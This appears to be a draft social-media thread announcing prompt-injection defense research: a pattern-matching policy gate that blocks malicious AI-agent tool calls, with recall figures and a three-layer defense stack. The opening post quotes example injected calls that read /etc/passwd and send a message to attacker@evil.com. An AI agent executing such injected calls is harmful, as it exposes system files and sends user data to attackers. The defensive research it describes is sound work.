# Round 6 Social Thread

## Post 1 (Hook)
Your AI agent just got prompt-injected. The model generates `read_file("/etc/passwd")` and `send_message(to: "attacker@evil.com")`.

What if you could catch those calls before they execute?

We built a tool-call policy gate. Here's what we found. (thread)

## Post 2 (Setup)
We tested 90 unique tool calls — malicious reads, exfiltration commands, data theft messages — against 4 filter configurations (360 evaluations total).

The question: can simple pattern matching (not ML) catch malicious tool calls without breaking legitimate dev workflows?

## Post 3 (Key result)
Result: YES.

The calibrated "balanced" config:
- 93% recall on malicious calls
- 0% false positive rate
- Zero blocked legitimate operations

50 out of 54 attacks caught. Zero developers annoyed.

[chart: precision-recall across 4 configs]

## Post 4 (Defense in depth)
This is layer 3 of our defense stack:

1. System instruction (don't follow injected instructions)
2. Boundary tags (demarcate untrusted content)
3. Policy gate (catch malicious outputs)

Layers 1+2 block ~90%. Layer 3 catches 93% of the rest. Combined: <1% effective injection rate.

## Post 5 (CTA)
All code, data, and configs are open source:
github.com/misty-step/laboratory

Round 6 of our prompt injection defense research. Previous rounds: boundary tags, scorer calibration, defense ablation, multi-turn attacks, security-utility tradeoffs.

Full blog post: blog_post.md
